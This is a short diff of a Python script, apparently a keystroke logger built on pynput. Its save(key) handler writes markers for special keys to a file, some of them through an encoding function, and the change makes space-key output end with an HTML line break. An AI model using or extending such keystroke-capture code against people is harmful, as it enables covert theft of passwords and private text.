@@ -34,7 +34,7 @@ def save(key):
 	elif key == keyboard.Key.esc:
 		f.write(ende('[Esc] \n<br>'))
 	elif key == keyboard.Key.space:
-		f.write(' \n')
+		f.write(' \n<br>')
 	elif key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
 		f.write(ende('[Shift] \n<br>'))
 	elif key == keyboard.Key.backspace:
